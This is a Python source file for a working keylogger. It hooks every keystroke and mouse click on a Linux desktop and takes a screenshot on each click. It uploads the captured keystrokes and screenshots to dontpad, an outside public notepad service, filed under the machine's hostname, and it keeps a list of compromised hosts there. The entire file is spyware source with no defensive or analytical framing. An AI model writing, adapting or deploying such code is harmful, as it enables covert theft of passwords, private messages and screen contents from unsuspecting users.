import pyxhook
import time
import dontpad
import socket
import screen

class KeyLogger:
	def __init__(self):
		self.current = ""
		self.final_file = ""
		self.old_time = time.time()
		self.max_delta = 3
		self.should_stop = ""
		self.stop_criterion = "stop listening"
		self.base_url = ":"
		self.name = socket.gethostname()
		self.url = self.base_url + "/" + self.name

	def treat(self, key):
		if key in " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*():,./\"\'":
			return key
		elif key == "<":
			return "\<"
		elif key == ">":
			return "\>"
		elif key == "space":
			return " " 
		elif key == "comma":
			return ","
		elif key == "period":
			return "." 
		elif key == "apostrophe":
			return "\'"
		elif key == "exclam":
			return "!"
		elif key == "slash":
			return "/"
		elif key == "numbersign":
			return "#"
		elif key == "at":
			return "@"
		elif key == "dollar":
			return "$"
		elif key == "percent":
			return "%"
		elif key == "asciicircum":
			return "^"
		elif key == "ampersand":
			return "&"
		elif key == "asterisk":
			return "*"
		elif key == "parenleft":
			return "("
		elif key == "parenright":
			return ")"
		elif key == "semicolon":
			return ";"
		elif key == "colon":
			return ":"
		elif key == "bracketleft":
			return "["
		elif key == "bracketright":
			return "]"
		elif key == "minus":
			return "-"
		elif key == "plus":
			return "+"
		elif key == "equal":
			return "="
		elif key == "underscore":
			return "_"
		elif key == "less":
			return "<<&lt;>>"
		elif key == "greater":
			return "<<&gt;>>"
		elif key == "question":
			return "?"
		elif key == "quotedbl":
			return "\""
		elif key == "braceleft":
			return "{"
		elif key == "braceright":
			return "}"
		else:
			return "<<" + key + ">>"

	def keyboard_down(self, e):
		t = time.time()
		delta_t = t - self.old_time
		treated_key = self.treat(e.Key)
		if self.should_stop in self.stop_criterion:
			self.should_stop += treated_key
		else:
			self.should_stop = treated_key
		self.current+= treated_key
		if delta_t > self.max_delta or self.should_stop == self.stop_criterion:
			self.final_file += "\n<p t=\""+ str(t) + "\">\n" + self.current + "</p>\n"
			self.current = ""

		self.old_time = t

		if self.should_stop == self.stop_criterion:
			hostnames = dontpad.read(self.base_url)["body"]
			if self.name not in hostnames:
				hostnames += self.name + "\n"
				dontpad.write(self.base_url, hostnames)
			old = dontpad.read(self.url)["body"]
			dontpad.write(self.url, old + "\n\n<br />\n\n" + self.final_file)
			hook.cancel()

	def mouse_click(self, e):
		screenshots = screen.grab()
		for img in screenshots:
			t = str(time.time())
			old = dontpad.read(self.url + "/imgs/")["body"]
			dontpad.write(self.url + "/imgs/", old + t + "\n")
			dontpad.write(self.url + "/imgs/" + t, img)

kl = KeyLogger()
hook = pyxhook.HookManager()
hook.KeyDown = kl.keyboard_down
hook.MouseAllButtonsDown = kl.mouse_click
hook.HookKeyboard()
hook.HookMouse()
hook.start()